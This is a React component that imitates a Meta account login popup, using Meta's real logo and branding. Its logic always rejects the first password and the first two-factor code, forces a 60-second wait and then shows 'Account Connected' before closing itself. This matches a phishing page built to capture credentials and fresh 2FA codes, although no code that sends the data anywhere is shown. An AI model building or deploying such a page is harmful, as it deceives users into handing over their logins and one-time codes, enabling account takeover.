import React, { useState, useEffect, useRef } from "react";
import { 
  Shield, 
  Loader2, 
  CheckCircle2, 
  Lock, 
  X
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";

enum LoginStep {
  LOGIN_FIRST_ATTEMPT = 0,
  LOGIN_SECOND_ATTEMPT = 1,
  VERIFICATION_FIRST_ATTEMPT = 2,
  VERIFICATION_TIMEOUT = 3,
  VERIFICATION_SECOND_ATTEMPT = 4,
  SUCCESS = 5
}

const MetaLoginPopup = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(LoginStep.LOGIN_FIRST_ATTEMPT);
  const [countdown, setCountdown] = useState(60);
  const codeInputRef = useRef<HTMLInputElement>(null);
  
  // Reset the timer when we reach the timeout step
  useEffect(() => {
    if (currentStep === LoginStep.VERIFICATION_TIMEOUT) {
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            setCurrentStep(LoginStep.VERIFICATION_SECOND_ATTEMPT);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(timer);
    }
    
    // Close the window when verification is successful
    if (currentStep === LoginStep.SUCCESS) {
      const timer = setTimeout(() => {
        window.close();
      }, 2000);
      
      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  // Focus on the code input field when it becomes visible
  useEffect(() => {
    if (
      (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
       currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && 
      codeInputRef.current
    ) {
      codeInputRef.current.focus();
    }
  }, [currentStep]);

  // Random delay between 3-5 seconds
  const getRandomDelay = () => Math.floor(Math.random() * 2000) + 3000;
  
  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Simulate authentication process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!email || !password) {
        setIsLoading(false);
        alert("Please enter both email and password.");
        return;
      }
      
      if (currentStep === LoginStep.LOGIN_FIRST_ATTEMPT) {
        // First password attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          alert("The password you entered is incorrect. Please try again.");
          setPassword("");
          setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
        }, 500); // A small additional delay for the error message
      } else {
        // Show success for the second attempt, then transition to verification
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
        }, 800);
      }
    }, getRandomDelay());
  };

  const handleVerificationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Simulate verification process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!verificationCode || verificationCode.length < 6) {
        setIsLoading(false);
        alert("Please enter a valid verification code (at least 6 digits).");
        return;
      }
      
      if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
        // First verification attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          alert("The verification code you entered is incorrect. Please wait 60 seconds before trying again.");
          setVerificationCode("");
          setCountdown(60);
          setCurrentStep(LoginStep.VERIFICATION_TIMEOUT);
        }, 500);
      } else {
        // Second verification attempt succeeds
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.SUCCESS);
        }, 800);
      }
    }, getRandomDelay());
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto p-4 flex justify-between items-center">
          <img 
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
            alt="Meta Logo" 
            className="h-8"
          />
          <button 
            onClick={() => window.close()} 
            className="text-gray-500 hover:text-gray-800"
          >
            <X className="h-5 w-5" />
          </button>
        </div>
      </header>
      
      <main className="flex-grow flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md">
          {currentStep === LoginStep.SUCCESS ? (
            <div className="text-center">
              <CheckCircle2 className="h-16 w-16 text-green-500 mx-auto mb-4" />
              <h2 className="text-2xl font-bold mb-4">Account Connected</h2>
              <p className="text-gray-600 mb-4">
                Your Meta account has been successfully connected. This window will close automatically.
              </p>
              <Progress value={100} className="h-2" />
            </div>
          ) : (
            <>
              <div className="text-center mb-6">
                <h2 className="text-2xl font-bold text-[#1877F2]">Meta Account</h2>
                <p className="text-gray-600 mt-2">
                  Connect your account to continue with your application
                </p>
              </div>
              
              {/* Login Steps */}
              {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                <form onSubmit={handlePasswordSubmit} className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="email">Email or Phone</Label>
                    <Input 
                      id="email" 
                      type="text"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Email or phone number"
                      className="border-gray-300"
                      disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                    />
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="password">Password</Label>
                    <Input 
                      id="password" 
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      className="border-gray-300"
                      autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                    />
                  </div>
                  
                  <Button 
                    type="submit" 
                    className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-11"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center">
                        <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                        <span>Authenticating...</span>
                      </div>
                    ) : (
                      "Log In"
                    )}
                  </Button>
                  
                  {isLoading && (
                    <div className="mt-3">
                      <Progress value={75} className="h-1 bg-gray-200" />
                      <p className="text-xs text-center text-gray-500 mt-1">Verifying credentials...</p>
                    </div>
                  )}
                </form>
              )}
              
              {/* 2FA Verification Steps */}
              {(currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
                currentStep === LoginStep.VERIFICATION_TIMEOUT || 
                currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                <>
                  <div className="flex items-center justify-center mb-4">
                    <Shield className="h-8 w-8 text-[#1877F2] mr-2" />
                    <h3 className="text-xl font-bold">Two-factor authentication</h3>
                  </div>
                  
                  <p className="text-center text-gray-600 mb-4">
                    We've sent a verification code to the mobile number associated with your account.
                  </p>
                  
                  <form onSubmit={handleVerificationSubmit} className="space-y-4">
                    <div className="space-y-2">
                      <Label htmlFor="code" className="font-semibold">Enter the verification code</Label>
                      <Input 
                        id="code" 
                        type="text"
                        inputMode="numeric"
                        ref={codeInputRef}
                        value={verificationCode}
                        onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                        placeholder="Enter verification code"
                        className="border-gray-300 text-center text-xl font-bold h-16"
                        disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT || isLoading}
                        maxLength={8}
                      />
                      
                      <div className="text-xs text-gray-500 text-center mb-2">
                        {currentStep === LoginStep.VERIFICATION_TIMEOUT ? (
                          <div className="text-red-500 font-semibold">
                            Please wait {countdown} seconds before requesting a new code
                          </div>
                        ) : (
                          <div>
                            We sent a code to +1•••••{email.slice(-4) || "1234"}
                          </div>
                        )}
                      </div>
                    </div>
                    
                    <Button 
                      type="submit" 
                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-11"
                      disabled={isLoading || currentStep === LoginStep.VERIFICATION_TIMEOUT}
                    >
                      {isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                          <span>Verifying code...</span>
                        </div>
                      ) : (
                        "Verify Code"
                      )}
                    </Button>
                    
                    {isLoading && (
                      <div className="mt-3">
                        <Progress value={85} className="h-1 bg-gray-200" />
                        <p className="text-xs text-center text-gray-500 mt-1">Validating security code...</p>
                      </div>
                    )}
                  </form>
                </>
              )}
            </>
          )}
        </div>
      </main>
      
      <footer className="bg-white border-t p-4">
        <div className="max-w-7xl mx-auto text-center text-sm text-gray-500">
          <p>© Meta {new Date().getFullYear()}</p>
        </div>
      </footer>
    </div>
  );
};

export default MetaLoginPopup;